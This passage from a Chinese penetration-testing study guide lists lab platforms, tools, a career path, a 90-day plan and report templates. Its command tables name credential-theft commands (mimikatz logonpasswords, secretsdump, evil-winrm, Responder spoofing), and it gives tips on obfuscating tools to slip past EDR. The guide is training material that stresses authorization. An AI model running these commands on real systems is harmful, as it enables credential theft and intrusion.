- **学习类**：证书、课程笔记、读书笔记、错题本。
- **度量数据**：关键指标趋势图、学习时间记录、复盘总结。

### 社区与人脉拓展计划
1. **参与社群**：加入OWASP、FreeBuf、漏洞盒子交流群，与同行交流经验。
2. **持续贡献**：每季度至少提交1个漏洞到SRC/Bug Bounty平台，并跟进修复。
3. **技术传播**：维护个人博客/公众号，输出高质量技术文章或案例分析。
4. **导师制度**：寻找行业前辈指导，与同伴组成学习小组互相监督。
5. **会议活动**：每年至少参加2场安全大会（线下/线上），积极提问与分享。

### 模块作业
1. **个人成长路线图**：规划未来12个月的学习目标、里程碑、度量指标，并每月复盘一次。
2. **作品集搭建**：使用Notion/GitHub Pages整理技术作品与项目成果，形成可分享的作品集。
3. **学习度量仪表盘**：使用Grafana或Google Data Studio展示学习时长、项目数量、漏洞统计等数据。
4. **社区参与清单**：列出计划参与的社群、分享主题、时间节点，落实到任务管理工具。

---

### 实战环境推荐

### 9.1 在线靶场平台

**HackTheBox**:
```
特点: 真实环境、持续更新
难度: ★★★★☆
费用: 免费（VIP $10/月）

推荐路径:
1. Starting Point (入门)
2. Easy Machines (简单靶机)
3. OSCP-like Machines (类OSCP)
4. Retired Machines (历史靶机)

技能覆盖:
- Web应用渗透
- 系统渗透
- Active Directory
- 权限提升
```

**TryHackMe**:
```
特点: 引导式学习、适合初学者
难度: ★★★☆☆
费用: 免费（Premium $10/月）

推荐路径:
1. Complete Beginner
2. Web Fundamentals
3. Offensive Pentesting
4. Red Teaming

学习模块:
- Linux基础
- 网络基础
- Web应用安全
- 渗透测试方法论
- 后渗透技术
```

**PentesterLab**:
```
特点: 专业系统化课程
难度: ★★★★☆
费用: $20/月

课程体系:
- Web应用安全
- 网络渗透
- Unix系统
- Windows系统
- Active Directory
```

**Root-Me**:
```
特点: 挑战题库、技术深度
难度: ★★★☆☆
费用: 免费

分类:
- App-Script (脚本)
- App-System (系统)
- Cracking (破解)
- Cryptanalysis (密码分析)
- Forensic (取证)
- Network (网络)
- Programming (编程)
- Realist (现实场景)
- Steganography (隐写术)
- Web-Client (客户端)
- Web-Server (服务端)
```

### 9.2 本地环境搭建

**Web应用靶场**:
```bash
# DVWA
docker run --rm -it -p 80:80 vulnerables/web-dvwa

# bWAPP
docker run -d -p 80:80 raesene/bwapp

# OWASP Juice Shop
docker run -p 3000:3000 bkimminich/juice-shop

# WebGoat
docker run -p 8080:8080 -t webgoat/goatandwolf

# Mutillidae
docker run -d -p 80:80 -p 3306:3306 citizenstig/nowasp

# HackTheBox实验室
# 订阅VIP访问实验室环境
```

**系统渗透靶机**:
```
Metasploitable2
- 类型: Linux靶机
- 漏洞: 大量已知漏洞
- 用途: 基础漏洞利用学习

Metasploitable3
- 类型: Windows/Linux双系统
- 特点: 现代化漏洞
- 用途: 进阶渗透练习

VulnHub靶机系列
- Kioptrix系列
- HackLAB系列
- Mr-Robot
- DC系列
- BoredHackRZ系列
```

**内网渗透环境**:
```powershell
# GOAD (Game of Active Directory)
# 自动化部署AD环境

# Windows Server 2019 (域控)
Install-WindowsFeature AD-Domain-Services -IncludeManagementTools
Install-ADDSForest -DomainName "lab.local"

# Windows 10 (域成员)
Add-Computer -DomainName "lab.local"
Restart-Computer

# 配置漏洞环境
# - Kerberoasting账户
# - AS-REP Roastable用户
# - 未约束委派主机
# - ACL滥用
```

---

### 扩展学习资源

### 📚 推荐书籍

**基础入门**:
1. **《Web安全深度剖析》** - 从零开始的Web安全
2. **《白帽子讲Web安全》** - 国内经典入门书
3. **《黑客攻防技术宝典：Web实战篇（第2版）》** - 全面的Web安全参考

**进阶提升**:
4. **《Metasploit渗透测试指南》** - 渗透框架实战
5. **《内网安全攻防：渗透测试实战指南》** - 内网渗透技术
6. **《Web应用安全权威指南》** - Web安全深度
7. **《Android安全攻防实战》** - 移动安全

**高级专题**:
8. **《漏洞战争：软件漏洞分析精要》** - 漏洞挖掘
9. **《Fuzzing for Software Security Testing》** - 模糊测试
10. **《The Web Application Hacker's Handbook》** - Web安全圣经

### 🎓 在线课程

**免费课程**:
- **PortSwigger Web Security Academy**: 系统化Web安全课程
- **OWASP WebGoat**: 互动式Web安全学习
- **Cybrary**: 基础安全课程
- **TryHackMe Learning Paths**: 引导式学习路径

**付费认证**:
- **Offensive Security (OSCP)**: $999 - 业界金标准
- **SANS (GPEN)**: $7,500 - 全面渗透测试
- **eLearnSecurity (eCPPT)**: $400 - 性价比高
- **PentesterAcademy**: $49/月 - 订阅制学习

### 🔧 工具清单

**信息收集**:
```bash
nmap, masscan, rustscan          # 端口扫描
subfinder, amass, assetfinder    # 子域名枚举
gobuster, dirsearch, feroxbuster # 目录枚举
theHarvester, recon-ng, maltego  # OSINT
shodan, censys, zoomeye          # 互联网设备搜索
```

**漏洞扫描**:
```bash
nuclei, nikto, wpscan            # Web扫描
nessus, openvas, nexpose         # 综合漏洞扫描
burp suite, owasp zap            # Web代理
sqlmap, commix, xsstrike         # 特定漏洞
```

**漏洞利用**:
```bash
metasploit, empire, covenant     # 渗透框架
cobalt strike                    # 商业红队工具
powershell empire, poshc2        # PowerShell框架
impacket, crackmapexec           # 内网工具
```

**密码攻击**:
```bash
hashcat, john                    # 密码破解
hydra, medusa, patator           # 在线爆破
cewl, crunch                     # 字典生成
```

**后渗透**:
```bash
mimikatz, pypykatz, lazagne      # 凭证获取
bloodhound, sharphound           # AD分析
chisel, frp, ligolo              # 隧道工具
```

### 📰 安全资讯

**国内资源**:
- **FreeBuf**: 国内领先安全媒体
- **先知社区**: 技术文章分享
- **Seebug**: 漏洞平台
- **T00ls**: 黑客社区
- **看雪论坛**: 逆向工程

**国际资源**:
- **HackerOne**: 漏洞赏金平台
- **Bugcrowd**: 众包安全
- **Exploit-DB**: 漏洞库
- **0day.today**: 最新漏洞
- **MITRE ATT&CK**: 攻击战术知识库

**博客推荐**:
- PortSwigger Research
- Google Project Zero
- Trail of Bits Blog
- NCC Group Research

---

### 职业发展路径

### 初级渗透测试工程师（0-2年）
**技能要求**:
- 掌握基础渗透测试流程
- 熟练使用主流工具
- 理解OWASP Top 10
- 编写基础渗透测试报告

**年薪范围**: 15-25万（一线城市）

**工作内容**:
- 协助高级工程师执行渗透测试
- 漏洞验证和复现
- 编写测试文档
- 学习新技术和工具

### 中级渗透测试工程师（2-5年）
**技能要求**:
- 独立完成渗透测试项目
- 掌握多个专业领域（Web、移动、网络）
- 代码审计能力
- 漏洞研究和Exploit开发

**年薪范围**: 25-40万（一线城市）

**工作内容**:
- 独立负责渗透测试项目
- 内网渗透和APT模拟
- 编写高质量报告
- 指导初级工程师

### 高级渗透测试工程师（5-8年）
**技能要求**:
- 全栈渗透能力
- 0day漏洞挖掘
- 红队行动规划
- 安全产品研发

**年薪范围**: 40-70万（一线城市）

**工作内容**:
- 复杂项目技术负责人
- 红蓝对抗演练
- 安全研究和创新
- 团队技术培训

### 安全专家/架构师（8年以上）
**技能要求**:
- 深厚的技术积累
- 安全架构设计
- 团队管理能力
- 行业影响力

**年薪范围**: 70-150万+（一线城市）

**工作内容**:
- 安全战略规划
- 团队建设和管理
- 行业交流和分享
- 安全产品孵化

---

### 90天速成计划

### 第1个月：基础建设

**Week 1-2: 环境搭建与基础**
- Day 1-3: Kali Linux安装和配置
- Day 4-7: HTTP协议、TCP/IP深入学习
- Day 8-10: Burp Suite完整学习
- Day 11-14: 完成DVWA所有Security级别

**Week 3-4: Web漏洞基础**
- Day 15-17: SQL注入原理与实践
- Day 18-20: XSS攻击技术
- Day 21-23: CSRF与文件上传
- Day 24-28: 完成PortSwigger Academy前20个Lab

**阶段目标**:
- [ ] 搭建完整的渗透测试环境
- [ ] 理解常见Web漏洞原理
- [ ] 熟练使用Burp Suite
- [ ] 完成50个简单CTF题目

### 第2个月：技能深化

**Week 5-6: 系统渗透**
- Day 29-31: Nmap深度学习
- Day 32-35: Metasploit框架使用
- Day 36-38: Windows权限提升
- Day 39-42: Linux权限提升

**Week 7-8: 高级漏洞**
- Day 43-45: 反序列化漏洞
- Day 46-48: XXE和SSRF
- Day 49-51: SSTI和命令注入
- Day 52-56: 完成10个中等难度靶机

**阶段目标**:
- [ ] 掌握系统渗透基础
- [ ] 理解高级Web漏洞
- [ ] 完成Metasploitable2全部漏洞
- [ ] HackTheBox 10台简单靶机

### 第3个月：综合实战

**Week 9-10: 后渗透技术**
- Day 57-60: 凭证获取（Mimikatz等）
- Day 61-63: 横向移动技术
- Day 64-66: 内网渗透基础
- Day 67-70: 持久化和痕迹清理

**Week 11-12: 专项技术**
- Day 71-73: 移动应用渗透基础
- Day 74-76: API安全测试
- Day 77-80: 云环境安全（AWS基础）
- Day 81-84: 完整项目实战

**Week 13: 总结提升**
- Day 85-86: 编写完整渗透测试报告
- Day 87-88: 工具链整理和自动化
- Day 88-90: 模拟OSCP考试

**阶段目标**:
- [ ] 掌握后渗透核心技术
- [ ] 完成一个完整渗透项目
- [ ] HackTheBox 20台靶机
- [ ] 编写3份专业报告

### 资源与任务配置建议
- **课程**：Offensive Security PWK实验室、PortSwigger Web Security Academy高级实验、TryHackMe `Offensive Pentesting`路径。
- **书籍**：《Red Team Field Manual》《The Hacker Playbook 3》《实战内网安全攻防》《Kubernetes安全：攻防实践》。
- **工具链维护**：使用Ansible或Docker维护渗透工具环境，保持版本一致；建立脚本仓库记录常用命令。

### 周任务追踪表示例
| 周次 | 学习主题 | 关键任务 | 预计投入时间 | 实际完成情况 | 自我评分 | 改进计划 |
| --- | --- | --- | --- | --- | --- | --- |
| Week 1 | 环境搭建 | Kali安装、工具整理、网络拓扑绘制 | 12h | ✔️ | 8/10 | 优化镜像下载脚本 |
| Week 4 | Web漏洞 | 完成OWASP Top 10实验、撰写复现笔记 | 15h | ✔️ | 9/10 | 增加Burp Extender脚本练习 |
| Week 7 | 系统提权 | Windows/Linux提权技巧、编写提权脚本 | 18h | ⏳ | 6/10 | 整理提权清单与检测脚本 |
| Week 10 | 横向移动 | BloodHound分析、RDP/WMI实操 | 16h | ✔️ | 8/10 | 提升脚本稳定性与日志记录 |
| Week 12 | 云安全 | AWS IAM攻击链、S3/EC2利用 | 20h | ⏳ | 7/10 | 学习Terraform安全配置 |

### 学习日志模板
```markdown
## 日期：2024-XX-XX

### 今日学习内容
- 主题：内网渗透 - 凭证获取
- 活动：
  - [ ] 阅读《红蓝对抗中的攻防之道》第3章
  - [ ] 复现mimikatz DCSync操作
  - [ ] 编写PowerShell脚本提取LSASS内存

### 关键收获
- 理解域控复制协议与KRBTGT账户的重要性
- 熟悉`lsadump::dcsync`的前置条件与日志痕迹
- 掌握EDR阻断时的常见绕过策略

### 遇到的问题
- 远程会话不稳定，需研究隧道与代理方案
- 某次操作触发EDR告警，需要制定安全白名单

### 明日计划
- [ ] 使用BloodHound分析高价值节点
- [ ] 复习Golden Ticket与Silver Ticket差异
- [ ] 完成演练总结初稿
```

### 常见风险与应对
- **时间拖延**：采用番茄工作法（25分钟专注+5分钟休息），每日复盘任务。
- **信息过载**：将知识点分类整理到知识库，使用标签/思维导图管理。
- **缺乏实战**：定期参加CTF、攻防演练或漏洞赏金平台，积累真实经验。
- **工具依赖**：先手工验证关键步骤，再使用自动化工具，确保理解原理。
- **知识遗忘**：通过写博客、录视频、做分享强化记忆。

---

### 安全提醒

1. **法律第一**: 所有技术仅用于授权测试，违法必究
2. **授权为先**: 没有书面授权文件，禁止任何测试
3. **数据保护**: 严格保密测试中获取的所有数据
4. **最小影响**: 避免对生产环境造成任何破坏
5. **及时沟通**: 发现高危漏洞立即报告
6. **持续学习**: 安全技术日新月异，保持学习状态
7. **道德准则**: 技术是为了保护，而非破坏

---

## 附录A：常用工具与命令大全

### A.1 被动信息收集（OSINT）
| 工具 | 适用场景 | 示例命令 | 注意事项 |
| --- | --- | --- | --- |
| `amass` | 枚举子域、关系图谱 | `amass enum -passive -d target.com -config config.ini` | 配置API密钥获取更多数据；输出去重 |
| `subfinder` | 快速子域收集 | `subfinder -d target.com -all -silent` | 与其他工具联合使用提升覆盖率 |
| `assetfinder` | 公司相关域名和资产发现 | `assetfinder --subs-only target.com` | 结合关键字，注意筛选误报 |
| `theHarvester` | 邮箱、域名、IP收集 | `theHarvester -d target.com -b all` | 需根据来源过滤重复数据 |
| `crt.sh` | 证书透明度查询 | `curl -s "https://crt.sh/?q=%25.target.com&output=json"` | 处理通配符证书，注意历史记录 |
| `hunter.io` | 邮箱格式与联系人信息 | Web界面/API查询 | 受限于配额，需遵守隐私政策 |
| `git-dumper` | Git泄露仓库获取 | `python3 git-dumper.py https://target.com/.git/ dump/` | 严格授权；注意敏感信息处理 |

### A.2 主动信息收集与扫描
| 工具 | 适用场景 | 示例命令 | 注意事项 |
| --- | --- | --- | --- |
| `nmap` | 端口扫描、服务识别 | `nmap -sS -sV -p- target.com -oA nmap/full` | 合理设置速率，避免触发防护 |
| `masscan` | 大规模端口扫描 | `masscan 0.0.0.0/0 -p80,443 --rate 10000` | 注意速率和法务限制；与nmap联合验证 |
| `naabu` | 快速端口探测 | `naabu -host target.com -p - -rate 2000` | 默认仅探测TCP，需要加`-s`启用UDP |
| `httpx` | HTTP资产指纹识别 | `httpx -l subdomains.txt -title -tech-detect -status-code` | 结合`-json`输出便于后处理 |
| `whatweb` | Web指纹识别 | `whatweb --color=never -i alive_hosts.txt` | 指纹库需定期更新 |
| `aquatone` | 页面截图与聚合 | `cat subdomains.txt | aquatone -ports xlarge` | 生成报告后注意脱敏 |

### A.3 Web安全测试工具
| 工具 | 功能 | 示例操作 | 进阶技巧 |
| --- | --- | --- | --- |
| `Burp Suite` | Web代理、漏洞扫描 | 拦截请求、使用Repeater/Intruder | 自定义插件、使用Matcher&Extractor自动化分析 |
| `sqlmap` | SQL注入自动化 | `sqlmap -u "http://target.com?id=1" --risk=3 --level=5 --dump` | 结合自定义payload、延迟注入绕过防护 |
| `ffuf` | 目录/参数爆破 | `ffuf -w wordlist.txt -u https://target/FUZZ` | 使用`-recursion`递归、配合`-H`自定义头 |
| `wfuzz` | 参数枚举与爆破 | `wfuzz -c -w params.txt -d "id=FUZZ" https://target/item` | 支持多个`-w`组合；注意编码 |
| `xsstrike` | XSS检测与payload生成 | `python3 xsstrike.py -u "https://target/search?q=test"` | 结合`--crawl`扫描深层路径 |
| `nuclei` | 基于模板的漏洞扫描 | `nuclei -l targets.txt -t cves/ -o nuclei.log` | 编写自定义模板；结合CI/CD使用 |

### A.4 漏洞利用与后渗透
| 工具 | 主要用途 | 示例命令 | 风险提示 |
| --- | --- | --- | --- |
| `Metasploit` | 漏洞利用框架 | `msfconsole` / `use exploit/multi/http/struts2_code_exec` | 使用前确认授权；记录操作日志 |
| `Cobalt Strike` | 红队武器化平台 | teamserver启动、Beacon管理 | 商业版权受限；确保合法授权 |
| `Sliver` | 开源C2框架 | `sliver-server` / `generate beacon --mtls` | 配置证书防止被拦截 |
| `mimikatz` | 凭证获取、票据操作 | `privilege::debug`、`sekurlsa::logonpasswords` | 易被杀软拦截，需旁路处理 |
| `Impacket` | SMB、Kerberos工具集 | `secretsdump.py`, `wmiexec.py`, `psexec.py` | 正确设置防火墙规则、避免破坏系统 |
| `BloodHound` | AD攻击路径图谱 | `SharpHound.exe -c All` | 保护图谱数据，避免泄露敏感结构 |
| `Responder` | LLMNR/NBNS欺骗 | `responder -I eth0` | 控制影响范围；提前通知蓝队 |
| `evil-winrm` | Windows远程shell | `evil-winrm -i 10.0.0.5 -u admin -p Passw0rd` | 密码请安全保管；记录操作 |

### A.5 云与容器安全工具
| 工具 | 适用云商/场景 | 示例命令 | 注意事项 |
| --- | --- | --- | --- |
| `aws cli` | AWS资源枚举 | `aws iam list-roles --profile pentest` | 使用只读策略，避免误操作 |
| `pacu` | AWS渗透框架 | `pacu` / `run iam__enum_roles` | 需配置API密钥；遵守授权范围 |
| `aqua trivy` | 容器镜像扫描 | `trivy image repo/app:latest` | 定期更新漏洞库；注意扫描延迟 |
| `kube-hunter` | K8s安全检测 | `kube-hunter --remote 10.0.0.10` | 仅在测试集群使用，避免DoS |
| `cloudbrute` | 云存储枚举 | `cloudbrute -u target` | 遵守云厂商条款；避免数据泄露 |
| `gcloud` | GCP资源管理 | `gcloud iam service-accounts list` | 使用专用项目和账户 |

### A.6 协作与证据管理
| 工具 | 功能 | 使用要点 | 输出示例 |
| --- | --- | --- | --- |
| `Obsidian` / `Notion` | 笔记与知识库管理 | 结构化记录测试过程、关联文档 | 渗透项目知识库、模板库 |
| `Draw.io` / `Excalidraw` | 拓扑与攻击路径绘制 | 图层分明、添加风险标注 | 攻击面图、演示材料 |
| `Jira` / `Trello` | 项目协作 | 定义泳道、风险字段、自动化规则 | 漏洞修复看板、任务追踪 |
| `Timesketch` | 时间线管理 | 聚合多源日志，分析事件序列 | 攻击活动时间轴 |
| `Gitolite` / `Gitea` | 代码仓库 | 管理脚本与POC，控制访问权限 | 自动化脚本库、版本记录 |

---

## 附录B：项目文档模板

### B.1 测试授权函模板（Markdown）
```markdown
# 渗透测试授权书

- 项目名称：<填写>
- 甲方单位：<填写>
- 乙方单位：<填写>
- 测试时间：<开始日期> 至 <结束日期>
- 测试范围：
  - 系统/域名：<列出具体资产>
  - 网络段：<填写>
  - 排除项：<列出禁止测试的系统>
- 测试方式：<黑盒/灰盒/白盒>
- 限制条件：<禁止DoS、禁止破坏数据等>
- 乙方义务：遵守法律法规、保护数据、按计划汇报
- 甲方义务：提供必要权限、及时响应风险通报
- 保密条款：<保密期限、资料处理方式>
- 责任约定：<意外处置、损失承担>
- 签署：
  - 甲方法定代表人（签字）：
  - 乙方法定代表人（签字）：
  - 日期：
```

### B.2 渗透测试计划模板
```markdown
# 渗透测试计划书

## 1. 项目概述
- 背景、目标、测试类型

## 2. 范围与边界
- 资产清单、排除项、访问方式

## 3. 角色与职责
| 角色 | 姓名 | 联系方式 | 职责 |
| --- | --- | --- | --- |
| 项目经理 |  |  | 范围确认、沟通协调 |
| 技术负责人 |  |  | 渗透测试执行、风险评估 |
| 证据管理员 |  |  | 日志、截图、文件管理 |

## 4. 方法与工具
- 各阶段计划使用的工具、脚本、自动化方案

## 5. 时间计划
- 甘特图/里程碑列表

## 6. 风险与应急机制
- 风险等级、触发条件、应急联系人、回滚策略

## 7. 交付物清单
- 日报、周报、阶段性汇报、最终报告、复测报告
```

### B.3 日报模板
```markdown
# 渗透测试日报 - <日期>

## 1. 今日进展
- 侦察/信息收集：<描述>
- 漏洞验证：<描述>
- 后渗透：<描述>
- 其他：<描述>

## 2. 已发现风险
| 风险编号 | 严重级别 | 影响范围 | 状态 | 备注 |
| --- | --- | --- | --- | --- |

## 3. 次日计划
- <计划列表>

## 4. 支持请求
- 权限、账号、资产访问问题等
```

### B.4 项目复盘模板
```markdown
# 渗透测试项目复盘

## 1. 项目概述
- 测试目标、范围、时间、团队成员

## 2. 关键成果
- 高危/中危/低危漏洞数量及示例
- 攻击路径图、影响评估

## 3. 成功经验
- 工具/流程/协作亮点

## 4. 问题与挑战
- 技术难点、沟通问题、资源限制

## 5. 改进计划
- 短期改进、长期建设建议

## 6. 行动项追踪
| 编号 | 行动项 | 责任人 | 截止时间 | 状态 |
| --- | --- | --- | --- | --- |
```

---

## 附录C：常见问题与排错指南
| 场景 | 问题描述 | 根因分析 | 解决方案 | 预防措施 |
| --- | --- | --- | --- | --- |
| 资产扫描被拉黑 | 扫描触发防火墙封禁IP | 扫描速率过高或未经备案 | 使用白名单IP、降低速率、提前沟通 | 建立扫描计划备案表 |
| VPN连接不稳定 | 会话频繁断开 | 网络延迟、路由策略或ACL限制 | 切换协议、使用专用隧道、与甲方网络协同 | 测试前进行连通性验证 |
| 工具被EDR阻断 | 执行mimikatz/CS被拦截 | 终端防护策略严格 | 使用签名或混淆版工具、离线执行、事先沟通白名单 | 准备多套工具链、记录绕过步骤 |
| 数据库写操作失败 | 权限不足或触发审计 | 测试账号限制、触发安全策略 | 调整测试范围、使用只读方式验证 | 需求阶段确认操作边界 |
| 漏洞复现困难 | 甲方修复后环境变更 | 补丁造成环境差异 | 保留原始证据、使用容器重现 | 建立可复现环境、提交复现脚本 |
| 报告审核延迟 | 多部门参与，意见不统一 | 缺乏模板和评分标准 | 建立报告评审机制、统一格式 | 预先分享模板、设定时间线 |
| 证据丢失 | 本地存储损坏或误删 | 未使用集中存储与版本控制 | 使用加密云盘/版本库，定期备份 | 明确证据管理制度 |
| 发现高危无法复测 | 业务限制无法重放 | 漏洞修复或环境隔离 | 采用PoC脚本模拟验证、与甲方协商窗口期 | 事先定义复测流程与回滚策略 |

---

## 附录D：术语表与缩写
| 缩写 | 全称 | 中文解释 | 渗透测试意义 |
| --- | --- | --- | --- |
| APT | Advanced Persistent Threat | 高级持续性威胁 | 用于描述长期潜伏的攻击组织 |
| C2 | Command & Control | 指挥控制 | 攻击者远程控制受害主机的通道 |
| PTES | Penetration Testing Execution Standard | 渗透测试执行标准 | 指导整体流程的行业标准 |
| OSINT | Open Source Intelligence | 开源情报 | 用于收集目标外部信息 |
| OPSEC | Operational Security | 行动安全 | 保护渗透行动隐蔽性和安全 |
| ROI | Return on Investment | 投资回报率 | 评估安全投入的价值 |
| SLA | Service Level Agreement | 服务级别协议 | 约束响应时间与质量 |
| SIEM | Security Information and Event Management | 安全信息与事件管理 | 蓝队检测与日志分析平台 |
| IAM | Identity and Access Management | 身份与访问管理 | 云环境权限配置核心 |
| MITRE ATT&CK | MITRE Adversarial Tactics, Techniques and Common Knowledge | 攻击技战术框架 | 设计攻击模拟的知识库 |
| CVSS | Common Vulnerability Scoring System | 通用漏洞评分系统 | 风险量化标准 |
| IOC | Indicator of Compromise | 入侵指示指标 | 判断是否受到攻击的证据 |

---

## 附录E：学习资源索引

### E.1 网站与社区
- **国内**：安全客、先知社区、FreeBuf、蒲公英、看雪学院。
- **国际**：PentesterLand、PortSwigger Blog、PacketStorm、Exploit-DB、Red Team Village。
- **社交媒体**：Twitter `#bugbounty`、Reddit r/netsec、LinkedIn安全群组、Telegram安全频道。

### E.2 练习平台与实验室
- HackTheBox（含Pro Labs、Endgame）、TryHackMe、VulnHub、AttackDefense、PentesterLab。
- 企业级靶场：Immersive Labs、RangeForce、风刃攻防靶场、火线实验室。
- 云安全实验：AWS CloudGoat、AzureGoat、GCP GoatCounter。

### E.3 报告与研究
- Microsoft、Google TAG、Mandiant、CrowdStrike、Recorded Future年度威胁报告。
- 奇安信、腾讯科恩、蚂蚁安全实验室攻防研究文章。
- CNCERT、CISA、ENISA发布的行业通报与最佳实践。

### E.4 认证与备考资料
- OSCP/OSEP：Offensive Security官方课程、`TJ Null`靶机列表。
- CEH：CEH官方教材、Cybrary课程、Boson题库。
- CISSP/CompTIA Security+：官方Study Guide、Exam Cram系列。
- CISP-PTE：官方教材、历年真题、信安之路课程。

### E.5 学习建议汇总
1. 建立“目标→计划→执行→复盘”闭环，每周至少一次复盘。
2. 采用“60%实践 + 20%理论 + 20%分享”的时间分配模型。
3. 与蓝队、开发、运维保持沟通，理解业务需求与防守视角。
4. 记录所有实验、案例、错误，形成个人知识库与脚本库。
5. 定期挑战更高难度的靶机与真实项目，保持技术敏锐度。

---


## 📝 总结

渗透测试是一个需要持续学习和实践的专业领域。本指南提供了从基础到高级的完整学习路径，但真正的技能提升需要：

1. **扎实基础**: 深入理解网络协议、操作系统、编程语言
2. **大量实践**: 通过靶场、CTF、实际项目积累经验
3. **持续研究**: 关注最新漏洞、工具、攻击技术
4. **系统思维**: 从单点漏洞到完整攻击链
5. **职业道德**: 遵守法律法规，保护客户利益
6. **交流分享**: 参与社区，分享经验，共同进步

记住：优秀的渗透测试工程师不仅是技术专家，更是具有高度责任感和职业道德的安全从业者。

**"Security is not a product, but a process." - Bruce Schneier**

---

**文档版本**: v3.0
**最后更新**: 2024年4月
**维护者**: Penetration Testing Learning Team
**反馈邮箱**: security@example.com (请替换为实际邮箱)
